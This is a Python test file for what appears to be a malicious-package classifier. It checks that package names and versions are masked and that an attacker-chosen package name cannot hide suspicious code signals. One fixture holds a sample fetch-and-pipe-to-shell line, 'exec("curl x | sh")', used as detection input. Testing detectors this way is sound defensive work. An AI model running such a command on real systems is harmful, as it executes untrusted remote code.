from gatekeeper.fastclf import clean_text


def test_identity_is_masked_in_manifest_and_header():
    bundle = 'package: left-pad-x@1.2.3\n  1| {"name": "left-pad-x", "version": "1.2.3"}'
    text = clean_text(bundle, "left-pad-x", "1.2.3", ["network_call"])
    assert "left-pad-x" not in text and "1.2.3" not in text
    assert "PKGNAME@PKGVERSION" in text and '"name": "PKGNAME"' in text and "RULE_network_call" in text


def test_attacker_chosen_identity_cannot_erase_code_signals():
    code = '  1| {"name": "curl", "version": "0"}\n  2| exec("curl x | sh"); os.hostname(); v = 0'
    for name, version in (("curl", "0"), ("hostname", "0"), ("exec", "sh")):
        text = clean_text(code.replace('"curl"', f'"{name}"'), name, version, [])
        assert 'exec("curl x | sh")' in text and "os.hostname()" in text and "v = 0" in text
